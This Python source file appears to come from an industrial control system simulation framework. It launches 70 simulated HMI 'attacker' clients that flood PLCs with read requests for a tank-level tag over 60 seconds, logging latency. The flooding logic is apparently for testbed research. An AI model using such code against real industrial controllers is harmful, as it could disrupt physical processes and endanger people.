import logging
import os
import sys
from datetime import datetime
from time import sleep

from ics_sim.Device import HMI
from Configs import TAG, Controllers


class DDosAttacker(HMI):
    max = 0
    def __init__(self, name):
        super().__init__(name, TAG.TAG_LIST, Controllers.PLCs, 1)
        self._counter = 0
        self.target_tag = TAG.TAG_TANK_LEVEL_VALUE

    def _before_start(self):
        sys.stdin = os.fdopen(self._std)

        pass

    def _logic(self):
        try:
            self._counter += 1
            date1 = datetime.now()
            value = self._receive(self.target_tag)

        except Exception as e:
            self.report('get exception on read request {}'.format(self.name(), self._counter),  logging.INFO)

    def _post_logic_update(self):
        latency = self.get_logic_execution_time()
        if latency > DDosAttacker.max:
            DDosAttacker.max = latency
            self.report('Max seen latency reached to {}'.format(DDosAttacker.max), logging.INFO)
        if self._counter % 5000 == 0:
            self.report('sent {} read request for {}'.format(self.name(), self._counter, self.target_tag), logging.INFO)



if __name__ == '__main__':

    name_prefix = ''
    if len(sys.argv) > 1:
        name_prefix = sys.argv[1]

    attackers_count = 70
    attacker_list = []
    for i in range(attackers_count):
        attacker_list.append(DDosAttacker('attacker_' + name_prefix+str(i)))

    for attacker in attacker_list:
        attacker.start()

    sleep(60)

    for attacker in attacker_list:
        attacker.stop()



